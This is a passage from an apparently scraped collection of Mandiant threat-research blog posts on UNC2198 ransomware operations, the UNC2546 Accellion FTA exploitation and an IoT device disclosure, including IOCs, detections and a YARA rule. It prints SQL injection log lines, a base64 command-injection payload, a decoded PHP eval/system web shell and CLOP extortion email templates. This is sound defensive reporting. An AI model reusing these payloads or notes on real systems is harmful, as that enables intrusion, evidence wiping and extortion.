UNC2198 has used RCLONE, a command line utility used to synchronize cloud storage, to aid in the exfiltration of sensitive data. In all observed cases of data theft, RCLONE was used by UNC2198 from the “ C:\\PerfLogs\\rclone.exe ” file path. “ Time-to-Ransom \" (TTR) is the delta between first-attributed access time and the time of ransomware deployment. TTR serves as a useful gauge of how quickly an organization needs to respond to stave off a threat actor’s successful deployment of ransomware. TTR is not a perfect quantification, as external factors such as an organization’s security posture can drastically affect the measurement. In this post, the TTR of UNC2198 is measured between ICEDID activity to the deployment of ransomware. In July 2020, UNC2198 deployed MAZE ransomware using PSEXEC, and the TTR was 5.5 days. In October 2020, UNC2198 deployed EGREGOR ransomware using forced GPO updates, and the TTR was 1.5 days. Looking Forward Threat actors leveraging access obtained through mass malware campaigns to deploy ransomware is a growing trend. The efficiency of ransomware groups places a significant burden on defenders to rapidly respond before ransomware deployment. As ransomware groups continue to gain operational expertise through successful compromises, they will continue to shorten their TTR while scaling their operations. Understanding the TTPs fundamental to a specific operation like UNC2198 provides an edge to defenders in their response efforts. Our unparalleled understanding of groups like UNC2198 is translated into Mandiant Advantage . Accessing our holdings in Mandiant Advantage aids defenders in recognizing TTPs used by threat actors, assessing organizational risk, and taking action. Initial investments made into rapidly assessing a group’s modus operandi pays dividends when they inevitably evolve and swap out components of their toolset. Whether it be MAZE or EGREGOR, something icy or hot, Advanced Practices will continue to pursue these unchill threat actors. Acknowledgements Thank you to Dan Perez, Andrew Thompson, Nick Richard, Cian Lynch and Jeremy Kennelly for technical review of this content. In addition, thank you to Mandiant frontline responders for harvesting the valuable intrusion data that enables our research. Appendix: Malware Families PHOTOLOADER is a downloader that has been observed to download ICEDID. It makes an HTTP request for a fake image file, which is RC4 decrypted to provide the final payload. Host information is sent to the command and control (C2) via HTTP cookies. Samples have been observed to contain an embedded C2 configuration that contain the real C2 with a number of non-malicious domains. The non-malicious domains are contacted in addition to the real C2. WINDARC is a backdoor that hijacks the execution of TeamViewer to perform C2 communication. It supports plugins and accepts several backdoor commands. The commands include interacting with the TeamViewer tool, starting a reverse shell, loading new plugins, downloading and executing files, and modifying configuration settings. SYSTEMBC is a proxy malware that beacons to its C2 and opens new proxy connections between the C2 and remote hosts as indicated by the C2. Proxied communications are encrypted with RC4. The malware receives commands via HTTP and creates new proxy connections as directed. Underground sales advertisements refer to the software as a “ socks5 backconnect system” . The malware is typically used to hide the malicious traffic associated with other malware. Appendix: Detecting the Techniques FireEye security solutions detect these threats across email, endpoint, and network levels. The following is a snapshot of existing detections related to activity outlined in this blog post. Platform Detection Name FireEye Network Security Downloader.Macro.MOUSEISLAND Downloader.Win.PHOTOLOADER Trojan.PHOTOLOADER Downloader.IcedID Trojan.IcedID Malicious.SSL.IcedID Malicious.SSL.IcedIdCert Trojan.Malicious.Certificate Backdoor.BEACON Trojan.Generic Trojan.CobaltStrike FireEye Endpoint Security Real-Time (IOC) BLOODHOUND ATTACK PATH MAPPING (UTILITY) BLOODHOUND ATTACK PATH MAPPING A (UTILITY) COBALT STRIKE (BACKDOOR) COBALT STRIKE DEFAULT DLL EXPORT (BACKDOOR) COBALT STRIKE NAMED PIPE ECHO (BACKDOOR) EGREGOR RANSOMWARE (FAMILY) ICEDID (FAMILY) MAZE RANSOMWARE (FAMILY) MAZE RANSOMWARE A (FAMILY) METASPLOIT SERVICE ABUSE (UTILITY) MOUSEISLAND (DOWNLOADER) MOUSEISLAND A (DOWNLOADER) MOUSEISLAND B (DOWNLOADER) POWERSHELL DOWNLOADER (METHODOLOGY) POWERSHELL DOWNLOADER D (METHODOLOGY) SCHTASK CREATION FROM PROGRAMDATA (COLLECTION) SUSPICIOUS BITSADMIN USAGE A (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) WMIC SHADOWCOPY DELETE (METHODOLOGY) Malware Protection (AV/MG) SYSTEMBC Trojan.EmotetU.Gen.* Trojan.Mint.Zamg.O Generic.mg.* ICEID Gen:Variant.Razy.* Generic.mg.* BEACON Gen:Trojan.Heur.TP.TGW@bug909di Gen:Variant.Bulz.1217 Trojan.GenericKD.34797730 Generic.mg.* Appendix: Indicators 95b78f4d3602aeea4f7a33c9f1b49a97 SYSTEMBC 0378897e4ec1d1ee4637cff110635141 SYSTEMBC c803200ad4b9f91659e58f0617f0dafa SYSTEMBC ad4d445091a3b66af765a1d653fd1eb7 SYSTEMBC 9ecf25b1e9be0b20822fe25269fa5d02 SYSTEMBC e319f5a8fe496c0c8247e27c3469b20d SYSTEMBC a8a7059278d82ce55949168fcd1ddde4 SYSTEMBC aea530f8a0645419ce0abe1bf2dc1584 SYSTEMBC 3098fbc98e90d91805717d7a4f946c27 SYSTEMBC 45.141.84.212:4132 SYSTEMBC 45.141.84.223:4132 SYSTEMBC 79.141.166.158:4124 SYSTEMBC 149.28.201.253:4114 SYSTEMBC 193.34.167.34:80 BEACON 195.123.240.219:80 BEACON 23.227.193.167:80 BEACON 5.149.253.199:80 BEACON e124cd26fcce258addc85d7f010655ea BEACON 7ae990c12bf5228b6d1b90d40ad0a79f BEACON 3eb552ede658ee77ee4631d35eac6b43 BEACON c188c6145202b65a941c41e7ff2c9afd BEACON 2f43055df845742d137a18b347f335a5 BEACON 87dc37e0edb39c077c4d4d8f1451402c ICEDID 1efababd1d6bd869f005f92799113f42 ICEDID a64e7dd557e7eab3513c9a5f31003e68 ICEDID 9760913fb7948f2983831d71a533a650 ICEDID 14467102f8aa0a0d95d0f3c0ce5f0b59 ICEDID colombosuede.club ICEDID colosssueded.top ICEDID golddisco.top ICEDID june85.cyou ICEDID Appendix: Mandiant Security Validation Actions Organizations can validate their security controls against more than 60 actions with Mandiant Security Validation . VID Name A101-509 Phishing Email - Malicious Attachment, MOUSEISLAND, Macro Based Downloader A150-326 Malicious File Transfer - MOUSEISLAND, Download, Variant #1 A150-433 Malicious File Transfer - MOUSEISLAND, Download, Variant #2 A101-282 Malicious File Transfer - MOUSEISLAND Downloader, Download A104-632 Protected Theater - MOUSEISLAND Downloader, Execution A101-266 Command and Control - MOUSEISLAND, HTTP GET Request for PHOTOLOADER A101-280 Malicious File Transfer - PHOTOLOADER, Download A101-263 Command and Control - PHOTOLOADER, DNS Query #1 A101-281 Malicious File Transfer - ICEDID Stage 3, Download A101-279 Malicious File Transfer - ICEDID Final Payload, Download A101-265 Command and Control - ICEDID, DNS Query #1 A101-264 Command and Control - ICEDID, DNS Query #2 A101-037 Malicious File Transfer - MAZE, Download, Variant #1 A101-038 Malicious File Transfer - MAZE, Download, Variant #2 A101-039 Malicious File Transfer - MAZE, Download, Variant #3 A101-040 Malicious File Transfer - MAZE, Download, Variant #4 A101-041 Malicious File Transfer - MAZE, Download, Variant #5 A101-042 Malicious File Transfer - MAZE, Download, Variant #6 A101-043 Malicious File Transfer - MAZE, Download, Variant #7 A101-044 Malicious File Transfer - MAZE, Download, Variant #8 A101-045 Malicious File Transfer - MAZE, Download, Variant #9 A100-878 Command and Control - MAZE Ransomware, C2 Check-in A101-030 Command and Control - MAZE Ransomware, C2 Beacon, Variant #1 A101-031 Command and Control - MAZE Ransomware, C2 Beacon, Variant #2 A101-032 Command and Control - MAZE Ransomware, C2 Beacon, Variant #3 A104-734 Protected Theater - MAZE, PsExec Execution A104-487 Protected Theater - MAZE Ransomware, Encoded PowerShell Execution A104-485 Protected Theater - MAZE Ransomware Execution, Variant #1 A104-486 Protected Theater - MAZE Ransomware Execution, Variant #2 A104-491 Host CLI - MAZE, Create Target.lnk A104-494 Host CLI - MAZE, Dropping Ransomware Note Burn Directory A104-495 Host CLI - MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html Variant A104-496 Host CLI - MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt Variant A104-498 Host CLI - MAZE, Desktop Wallpaper Ransomware Message A150-668 Malicious File Transfer - EGREGOR, Download A101-460 Command and Control - EGREGOR, GET DLL Payload A150-675 Protected Theater - EGREGOR, Execution, Variant #1 A101-271 Malicious File Transfer - BEACON, Download, Variant #1 A150-610 Malicious File Transfer - BEACON, Download A150-609 Command and Control - BEACON, Check-in A104-732 Protected Theater - BEACON, Mixed Unicode-Escaped and ASCII Characters Execution A101-514 Malicious File Transfer - WINDARC, Download, Variant #1 A100-072 Malicious File Transfer - SYSTEMBC Proxy, Download A100-886 Malicious File Transfer - Rclone.exe, Download A100-880 Malicious File Transfer - Bloodhound Ingestor C Sharp Executable Variant, Download A100-881 Malicious File Transfer - Bloodhound Ingestor C Sharp PowerShell Variant, Download A100-882 Malicious File Transfer - Bloodhound Ingestor PowerShell Variant, Download A100-877 Active Directory - BloodHound, CollectionMethod All A101-513 Malicious File Transfer - SOURBITS, Download, Variant #1 A104-733 Protected Theater - CVE-2020-0787, Arbitrary File Move A100-353 Command and Control - KOADIC Agent (mshta) A100-355 Command and Control - Multiband Communication using KOADIC A104-088 Host CLI - Timestomp W/ PowerShell A104-277 Host CLI - EICAR COM File Download via PowerShell A104-281 Host CLI - EICAR TXT File Download via PowerShell A104-664 Host CLI - EICAR, Download with PowerShell A150-054 Malicious File Transfer - EMPIRE, Download A100-327 Command and Control - PowerShell Empire Agent (http) A100-328 Lateral Movement, Execution - PsExec A100-498 Scanning Activity - TCP Port Scan for Open RDP A100-502 Scanning Activity - UDP Port Scan for Open RDP A100-316 Lateral Movement - PSSession and WinRM A104-081 Host CLI - Mshta Appendix: UNC2198 MITRE ATT&CK Mapping ATT&CK Tactic Category Techniques Resource Development Acquire Infrastructure (T1583) Virtual Private Server (T1583.003) Develop Capabilities (T1587) Digital Certificates (T1587.003) Obtain Capabilities (T1588) Code Signing Certificates (T1588.003) Digital Certificates (T1588.004) Initial Access Phishing (T1566) Spearphishing Attachment (T1566.001) External Remote Services (T1133) Valid Accounts (T1078) Execution Command and Scripting Interpreter (T1059) PowerShell (T1059.001) Visual Basic (T1059.005) Windows Command Shell (T1059.003) Scheduled Task/Job (T1053) Scheduled Task (T1053.005) System Services (T1569) Service Execution (T1569.002) User Execution (T1204) Malicious File (T1204.002) Windows Management Instrumentation (T1047) Persistence External Remote Services (T1133) Scheduled Task/Job (T1053) Scheduled Task (T1053.005) Valid Accounts (T1078) Privilege Escalation Process Injection (T1055) Scheduled Task/Job (T1053) Scheduled Task (T1053.005) Valid Accounts (T1078) Defense Evasion Impair Defenses (T1562) Disable or Modify System Firewall (T1562.004) Disable or Modify Tools (T1562.001) Indicator Removal on Host (T1070) Timestomp (T1070.006) Indirect Command Execution (T1202) Modify Registry (T1112) Obfuscated Files or Information (T1027) Steganography (T1027.003) Process Injection (T1055) Signed Binary Proxy Execution (T1218) Mshta (T1218.005) Subvert Trust Controls (T1553) Code Signing (T1553.002) Valid Accounts (T1078) Virtualization/Sandbox Evasion (T1497) Credential Access OS Credential Dumping (T1003) Discovery Account Discovery (T1087) Local Account (T1087.001) Domain Trust Discovery (T1482) File and Directory Discovery (T1083) Permission Groups Discovery (T1069) System Information Discovery (T1082) System Network Configuration Discovery (T1016) System Owner/User Discovery (T1033) Virtualization/Sandbox Evasion (T1497) Lateral Movement Remote Services (T1021) Remote Desktop Protocol (T1021.001) SMB/Windows Admin Shares (T1021.002) SSH (T1021.004) Collection Archive Collected Data (T1560) Archive via Utility (T1560.001) Command and Control Application Layer Protocol (T1071) Web Protocols (T1071.001) Encrypted Channel (T1573) Asymmetric Cryptography (T1573.002) Ingress Tool Transfer (T1105) Proxy (T1090) Multi-hop Proxy (T1090.003) Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-02-22",
                    "source": "www.fireeye.com"
                },
                "text": "Starting in mid-December 2020, malicious actors that Mandiant tracks as UNC2546 exploited multiple zero-day vulnerabilities in Accellion’s legacy File Transfer Appliance (FTA) to install a newly discovered web shell named DEWMODE. The motivation of UNC2546 was not immediately apparent, but starting in late January 2021, several organizations that had been impacted by UNC2546 in the prior month began receiving extortion emails from actors threatening to publish stolen data on the “CL0P^_- LEAKS\" .onion website. Some of the published victim data appears to have been stolen using the DEWMODE web shell. Notably, the number of victims on the “CL0P^_- LEAKS\" shaming website has increased in February 2021 with organizations in the United States, Singapore, Canada, and the Netherlands recently outed by these threat actors. Mandiant has previously reported that FIN11 has threatened to post stolen victim data on this same .onion site as an additional tactic to pressure victims into paying extortion demands following the deployment of CLOP ransomware. However, in recent CLOP extortion incidents, no ransomware was deployed nor were the other hallmarks of FIN11 present. We are currently tracking the exploitation of the zero-day Accellion FTA vulnerabilities and data theft from companies running the legacy FTA product as UNC2546, and the subsequent extortion activity as UNC2582. We have identified overlaps between UNC2582, UNC2546, and prior FIN11 operations, and we will continue to evaluate the relationships between these clusters of activity. For more information on our use of ‘UNC’ designations, see our blog post, \" DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors .\" Mandiant has been working closely with Accellion in response to these matters and will be producing a complete security assessment report in the coming weeks. At this time, Accellion has patched all FTA vulnerabilities known to be exploited by the threat actors and has added new monitoring and alerting capabilities to flag anomalies associated with these attack vectors. Mandiant has validated these patches. Mandiant is currently performing penetration testing and code review of the current version of the Accellion FTA product and has not found any other critical vulnerabilities in the FTA product based on our analysis to date. Accellion customers using the FTA legacy product were the targets of the attack. Accellion FTA is a 20-year-old product nearing end of life. Accellion strongly recommends that FTA customers migrate to kiteworks , Accellion’s enterprise content firewall platform. Per Accellion, Kiteworks is built on an entirely different code base. The following CVEs have since been reserved for tracking the recently patched Accellion FTA vulnerabilities: CVE-2021-27101 - SQL injection via a crafted Host header CVE-2021-27102 - OS command execution via a local web service call CVE-2021-27103 - SSRF via a crafted POST request CVE-2021-27104 - OS command execution via a crafted POST request UNC2546 and DEWMODE In mid-December 2020, Mandiant responded to multiple incidents in which a web shell we call DEWMODE was used to exfiltrate data from Accellion FTA devices. The Accellion FTA device is a purpose-built application designed to allow an enterprise to securely transfer large files. The exfiltration activity has affected entities in a wide range of sectors and countries. Across these incidents, Mandiant observed common infrastructure usage and TTPs, including exploitation of FTA devices to deploy the DEWMODE web shell. Mandiant determined that a common threat actor we now track as UNC2546 was responsible for this activity. While complete details of the vulnerabilities leveraged to install DEWMODE are still being analyzed, evidence from multiple client investigations has shown multiple commonalities in UNC2546's activities. Evidence of Exploitation and DEWMODE Installation Mandiant has been able reconstruct many of the details about how Accellion FTAs have been compromised through examination of Apache and system logs from impacted devices—from initial compromise, to deployment of DEWMODE, and follow-on interaction. The earliest identification of activity associated with this campaign occurred in mid-December 2020. At this time, Mandiant identified UNC2546 leveraging an SQL injection vulnerability in the Accellion FTA. This SQL injection served as the primary intrusion vector. Mandiant observed evidence of SQL injection followed by subsequent requests to additional resources, as shown in Figure 1. [21/Dec/2020:18:14:32 +0000] [.'))union(select(c_value)from(t_global)where(t_global.c_param)=('w1'))#/sid#935ee00][rid#9700968/initial] (1) pass through /courier/document_root.html [21/Dec/2020:18:14:33 +0000] ['))union(select(loc_id)from(net1.servers)where(proximity)=(0))#/sid#935ee00][rid#9706978/initial] (1) pass through /courier/document_root.html [21/Dec/2020:18:14:33 +0000] [.'))union(select(reverse(c_value))from(t_global)where(t_global.c_param)=('w1'))#/sid#935ee00][rid#971c098/initial] (1) pass through /courier/document_root.html [21/Dec/2020:18:14:34 +0000] [<redacted>/sid#935ee00][rid#971a090/initial] (1) pass through /courier/sftp_account_edit.php [21/Dec/2020:18:14:35 +0000] [<redacted>/sid#935ee00][rid#9706978/initial] (1) pass through /courier/oauth.api [21/Dec/2020:18:14:35 +0000] [<redacted>/sid#935ee00][rid#9708980/initial] (1) pass through /courier/oauth.api Figure 1: SQL injection log UNC2546 has leveraged this SQL injection vulnerability to retrieve a key which appears to be used in conjunction with a request to the file sftp_account_edit.php . Immediately after this request, the built-in Accellion utility admin.pl was executed, resulting in an eval web shell being written to oauth.api . PWD=/home/seos/courier ; USER=root ; COMMAND=/usr/local/bin/admin.pl --edit_user=F --mount_cifs=- V,DF,$(echo${IFS}PD9waHAKCmlmKGlzc2V0KCRfUkVRVUVTVFsndG9rZW4nXSkpCnsKICAgIGV2YWwoYm FzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ3Rva2VuJ10pKTsKfQplbHNlIGlmKGlzc2V0KCRfUkVRVUVTVFsnd XNlcm5hbWUnXSkpCnsKICAgIHN5c3RlbSgkX1JFUVVFU1RbJ3VzZXJuYW1lJ10pOwp9CmVsc2UKewogICAgaG VhZGVyKCdMb2NhdGlvbjogLycpOwp9|base64${IFS}-d|tee${IFS}/home/seos/courier/oauth.api);FUK;\",PASSWORD # \\\" --passwd=pop Figure 2: Excerpt from log showing creation of eval web shell The decoded contents are shown in Figure 3. <?php if(isset($_REQUEST['token'])) { eval(base64_decode($_REQUEST['token'])); } else if(isset($_REQUEST['username'])) { system($_REQUEST['username']); } else { header('Location: /'); } Figure 3: Decoded eval web shell Almost immediately following this sequence, the DEWMODE web shell is written to the system. The timing of these requests suggests that DEWMODE was delivered via the oauth.api web shell; however, the available evidence does not indicate the exact mechanism used to write DEWMODE to disk. Mandiant has identified the DEWMODE web shell in one of the following two locations: /home/seos/courier/about.html /home/httpd/html/about.html The DEWMODE web shell (Figure 4) extracts a list of available files from a MySQL database on the FTA and lists those files and corresponding metadata—file ID, path, filename, uploader, and recipient—on an HTML page. UNC2546 then uses the presented list to download files through the DEWMODE web shell. Download requests are captured in the FTA’s web logs, which will contain requests to the DEWMODE web shell with encrypted and encoded URL parameters, where dwn is the file path and fn is the requested file name (Figure 5). The encrypted file path and name values visible in web logs can be decrypted using key material obtained from the database used by the targeted FTA. Given the complex nature of this process, if your organization needs assistance reviewing relevant logs, please contact Mandiant or Accellion. Figure 4: DEWMODE web shell screenshot GET /courier/about.html?dwn=[REDACTED]&fn=[REDACTED] HTTP/1.1\" 200 1098240863 \"-\" \"-\" \"-\" TLSv1.2 ECDHE-RSA-AES128-SHA256 Figure 5: DEWMODE File Download URL parameters Following file downloads, UNC2546 initiates a cleanup routine by passing a specific query parameter named csrftoken with the value 11454bd782bb41db213d415e10a0fb3c to DEWMODE. The following actions are performed: A shell script is written to /tmp/.scr , which will: Remove all references to about.html from log files located in /var/opt/apache/ Write the modified log file to /tmp/x then replace the original log file at /var/opt/apache/ Delete the contents of the /home/seos/log/adminpl.log log file. Remove /home/seos/courier/about.html (DEWMODE) and /home/seos/courier/oauth.api (eval web shell), and redirect command output to the file /tmp/.out Change the permissions of the output file to be readable, writeable and executable by all users, and set the owner to “nobody” Delete the script file /tmp/.scr and other temporarily created files to assist in cleanup Display cleanup output to the requesting user An example of a cleanup request and subsequent execution of the cleanup script can be seen in Figure 6. GET /courier/about.html?csrftoken=11454bd782bb41db213d415e10a0fb3c HTTP/1.1\" 200 5 \"-\" \"https://[REDACTED]//courier/about.html?aid=1000\" \"Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 sft sudo:   nobody : TTY=unknown ; PWD=/home/seos/courier ; USER=root ; COMMAND=/usr/local/bin/admin.pl --mount_cifs=AF,DF,'$(sh /tmp/.scr)',PASSWORD Figure 6: DEWMODE cleanup request Mandiant also identified a variant of DEWMODE ( bdfd11b1b092b7c61ce5f02ffc5ad55a ) which contained minor changes to the cleanup operation, including wiping of /var/log/secure and removing about.html and oauth.api from the directories /home/httpd/html/ instead of /home/seos/courier/ . In a subset of incidents, Mandiant observed UNC2546 requesting a file named cache.js.gz (Figure 7). Based on temporal file access to the mysqldump utility and mysql data directories, the archive likely contained a dump of the database. With the exception of cache.js.gz , Mandiant has not observed UNC2546 acquiring files from Accellion appliances through any method besides DEWMODE. GET //courier/cache.js.gz HTTP/1.1\" 200 35654360 \"-\" \"-\" \"python-requests/2.24.0\" TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 Figure 7: cache.js.gz file request UNC2582 Data Theft Extortion Shortly after installation of the web shell, in multiple cases within hours, UNC2546 leveraged DEWMODE to download files from compromised FTA instances. While the actors’ motivations were not immediately clear, several weeks after delivery of the DEWMODE web shell, victims began to receive extortion emails from an actor claiming association with the CLOP ransomware team (Figure 8 and Figure 9). The actors threatened to publish data on the \"CL0P^_- LEAKS\" .onion shaming website, unless the victim paid an extortion fee. We are tracking the subsequent extortion activity under a separate threat cluster, UNC2582. Despite tracking the exploitation and extortion activity in separate threat clusters we have observed at least one case where an actor interacted with a DEWMODE web shell from a host that was used to send UNC2582-attributed extortion email. Hello! Your network has been hacked, a lot of valuable data stolen. <description of stolen data, including the total size of the compressed files> We are the CLOP ransomware team, you can google news and articles about us. We have a website where we publish news and stolen files from companies that have refused to cooperate. Here is his address http://[redacted].onion/ - use TOR browser or http://[redacted].onion.dog/ - mirror. We are visited by 20-30 thousand journalists, IT experts, hackers and competitors every day. We suggest that you contact us via chat within 24 hours to discuss the current situation. <victim-specific negotiation URL> - use TOR browser We don't want to hurt, our goal is money. We are also ready to provide any evidence of the presence of files with us. Figure 8: Extortion Note Template 1 This is the last warning! If you don’t get in touch today, tomorrow we will create a page with screenshots of your files (like the others on our site),  send messages to all the emails that we received from your files. Due to the fact that journalists and hackers visit our site, calls and questions will immediately begin, online publications will begin to publish information about the leak, you will be asked to comment. Do not let this happen, write to us in chat or email and we will discuss the situation! CHAT:  <victim-specific negotiation URL> EMAIL: unlock@support-box.com USE TOR BROWSER! Figure 9: Extortion Note Template 2 Based on observations at several engagements, UNC2582 appears to follow a pattern of escalation to pressure victims into paying extortion demands. Initial emails are sent from a free email account, likely unique per victim, to a seemingly limited distribution of addresses at the victim organization. If the victim does not respond in a timely manner, additional emails are sent to a much larger number of recipients from hundreds or thousands of different email accounts and using varied SMTP infrastructure. In at least one case, UNC2582 also sent emails  to partners of the victim organization that included links to the stolen data and negotiation chat. Monitoring of the CL0P^_- LEAKS shaming website has demonstrated that UNC2582 has followed through on threats to publish stolen data as several new victims have appeared on the site in recent weeks, including at least one organization that has publicly confirmed that their Accellion FTA device had been recently targeted. Key Overlaps With FIN11 UNC2582 (Extortion) and FIN11 Mandiant identified overlaps between UNC2582’s data theft extortion activity and prior FIN11 operations, including common email senders and the use of the CL0P^_- LEAKS shaming site. While FIN11 is known for deploying CLOP ransomware, we have previously observed the group conduct data theft extortion without ransomware deployment, similar to these cases. Some UNC2582 extortion emails observed in January 2021 were sent from IP addresses and/or email accounts used by FIN11 in multiple phishing campaigns between August and December 2020, including some of the last campaigns that were clearly attributable to the group. We have not observed FIN11 phishing activity in the new year. FIN11 has typically paused their phishing operations over the winter holidays and had several extended gaps in their operations. However, the timing of this current hiatus is also consistent with UNC2582’s data theft extortion activity. UNC2582 extortion emails contained a link to the CL0P^_- LEAKS website and/or a victim specific negotiation page. The linked websites were the same ones used to support historical CLOP operations, a series of ransomware and data theft extortion campaigns we suspect can be exclusively attributed to FIN11. UNC2546 (FTA Exploitation and DEWMODE) and FIN11 There are also limited overlaps between FIN11 and UNC2546. Many of the organizations compromised by UNC2546 were previously targeted by FIN11. An IP address that communicated with a DEWMODE web shell was in the \"Fortunix Networks L.P.\" netblock, a network frequently used by FIN11 to host download and FRIENDSPEAK command and control (C2) domains. Implications The overlaps between FIN11, UNC2546, and UNC2582 are compelling, but we continue to track these clusters separately while we evaluate the nature of their relationships. One of the specific challenges is that the scope of the overlaps with FIN11 is limited to the later stages of the attack life cycle. UNC2546 uses a different infection vector and foothold, and unlike FIN11, we have not observed the actors expanding their presence across impacted networks. We therefore have insufficient evidence to attribute the FTA exploitation, DEWMODE, or data theft extortion activity to FIN11. Using SQL injection to deploy DEWMODE or acquiring access to a DEWMODE shell from a separate threat actor would represent a significant shift in FIN11 TTPs, given the group has traditionally relied on phishing campaigns as its initial infection vector and we have not previously observed them use zero-day vulnerabilities. Acknowledgements David Wong, Brandon Walters, Stephen Eckels and Jon Erickson Indicators of Compromise (IOCs) DEWMODE Web Shells MD5 SHA256 2798c0e836b907e8224520e7e6e4bb42 5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b bdfd11b1b092b7c61ce5f02ffc5ad55a 2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7 UNC2546 Source IP Addresses The following source IP addresses were observed in multiple UNC2546 intrusions: 45.135.229.179 79.141.162.82 155.94.160.40 192.154.253.120 192.52.167.101 194.88.104.24 Detections FireEye Detections FE_Webshell_PHP_DEWMODE_1 FEC_Webshell_PHP_DEWMODE_1 Webshell.PHP.DEWMODE Mandiant Security Validation A101-515 Malicious File Transfer - DEWMODE Webshell, Upload, Variant #1 A101-516 Malicious File Transfer - DEWMODE Webshell, Upload, Variant #2 DEWMODE YARA Rule The following YARA rule is not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives. This rule is intended to serve as a starting point for hunting efforts to identify DEWMODE payloads; however, it may need adjustment over time if the malware family changes. rule DEWMODE_PHP_Webshell { strings: $s1 = /if \\(isset\\(\\$_REQUEST\\[[\\x22\\x27]dwn[\\x22\\x27]]\\)[\\x09\\x20]{0,32}&&[\\x09\\x20]{0,32}isset\\(\\$_REQUEST\\[[\\x22\\x27]fn[\\x22\\x27]\\]\\)\\)\\s{0,256}\\{/ $s2 = \"<th>file_id</th>\" $s3 = \"<th>path</th>\" $s4 = \"<th>file_name</th>\" $s5 = \"<th>uploaded_by</th>\" $s6 = \"target=\\\\\\\"_blank\\\\\\\">Download</a></td>\" $s7 = \"Content-Type: application/octet-stream\" $s8 = \"Content-disposition: attachment; filename=\" condition: all of them } Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-one.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-02-17",
                    "source": "www.fireeye.com"
                },
                "text": "In 2019, Mandiant’s Red Team discovered a series of vulnerabilities present within Digi International’s ConnectPort X2e device, which allows for remote code execution as a privileged user. Specifically, Mandiant’s research focused on SolarCity’s (now owned by Tesla) rebranded ConnectPort X2e device, which is used in residential solar installations. Mandiant performs this type of work both for research purposes and in a professional capacity for their global clients. Mandiant collaborated with Digi International and SolarCity/Tesla to responsibly disclose the results of the research, resulting in the following two CVEs: Hardcoded Credentials (CVE-2020-9306, CVSS3.0: 8.8) Execution with Unnecessary Privileges (CVE-2020-12878, CVSS3.0: 8.4) Technical details can be found in Digi International’s 3.2.30.6 software release , and on FireEye’s Vulnerability Disclosures GitHub project ( FEYE-2020-0019 and FEYE-2020-0020 ). This two-part blog series will discuss our analysis at a high level, explore the novel techniques used to gain initial access to the ConnectPort X2e device, and share the technical details of the vulnerabilities discovered. Topics to be covered will include physical device inspection, debugging interface probing, chip-off techniques, firmware analysis, glitch attacks, and software exploitation. If you’re interested in continuing the story in Part Two, you can read it now . FAQ What devices are affected, and (potentially) how many devices are affected? The vulnerabilities described in this post affect ConnectPort X2e devices as well as the SolarCity rebranded variant. Other vendor devices may also be vulnerable. It is unclear how many ConnectPort X2e devices are deployed in the wild. How is the issue being addressed? Mandiant worked independently with Digi International and Tesla to remediate the vulnerabilities. Mandiant would like to thank Digi International and Tesla for their cooperation and dedication to improving the security of their products. How would an attacker exploit these vulnerabilities? An attacker with local network access (such as being connected to an individual’s home network via Ethernet) to a vulnerable X2e device can exploit CVE-2020-9306 and CVE-2020-12878 to gain privileged access to the device. Who discovered these vulnerabilities? Jake Valletta (@jake_valletta), Sam Sabetan (@samsabetan) More information such as videos and datasheets on Mandiant’s Embedded Device Assessments can be found here . Technical Analysis Device Overview Before diving into the details, we’ll discuss the ConnectPort X2e device (referred to as X2e device throughout the post) at a high level. The X2e device is a programmable gateway that connects to and collects data from ZigBee devices. It is commonly used as a Smart Energy gateway to interpret and send energy readings from a residential Solar Inverter. Vendors will often purchase an X2e device and configure it to read power consumption generated by a customer’s Solar Inverter. Figure 1 outlines a typical residential solar installation and highlights the X2e’s role. Figure 1: Typical X2e residential deployment For our research, we focused on the X2e device used by SolarCity, now Tesla, to retrieve data from residential solar installations. A typical setup would involve SolarCity providing a customer with a gateway that would be connected to the Internet via an Ethernet cable on the customer’s home network. Figure 2 shows one of the SolarCity branded X2e devices that we tested. Figure 2: X2e device Without even plugging in the X2e device, we know of at least two separate interfaces to explore: the Ethernet interface and the ZigBee radio. Note that we did not review the ZigBee interface between the X2e and a solar invertor, and that interface will not be covered in either Part One or Part Two of this series. Initial Analysis and Physical Inspection Network Reconnaissance We started our research by assessing the X2e device from a network perspective. By using nmap , we discovered that the device exposed both SSH and HTTP/HTTPS, shown in Figure 3. Figure 3: Port scan results from the X2e Upon accessing these services remotely, we noted that both services required authentication. We also performed limited brute force attempts, which were unsuccessful. Additionally, the underlying services were not vulnerable to any public exploits. With not many network-based leads to follow, we shifted our analysis to a hardware perspective to determine if any local attacks may be possible to gain initial access onto the device. Physical Board Inspection To begin our hardware analysis, we removed the plastic casing from the device and mapped out the various integrated circuit (IC) components and searched for potential debugging interfaces. Inventorying the components present on the circuit board (also known as a PCB) is a crucial step in understanding how the device was designed and what can be expected down the road. Figure 4 shows the mapped-out components as well as a cluster of pins that resembled a typical 3-pin universal asynchronous transmit/receive (UART) connection, a common debugging interface on embedded devices. Figure 4: X2e components and suspicious cluster of pins Without a remote connection to the X2e device, UART is an attractive target. UART typically provides the equivalent functionality of a service like SSH or Telnet and the added benefit of watching verbose output during system boot. To determine if the cluster of pins was a UART interface, we first soldered a 3-pin through-hole header to the PCB. Using a combination of continuity tests with a multimeter and the digital logic analyzer Saleae , it became apparent that we were in fact dealing with a UART interface. The Figure 5 shows the three pins (Ground, TX, RX) connected to the header. Attached to the other end of the three wires was a FTDI serial TTL-232 to USB adapter , which was connected to a Linux virtual machine. Figure 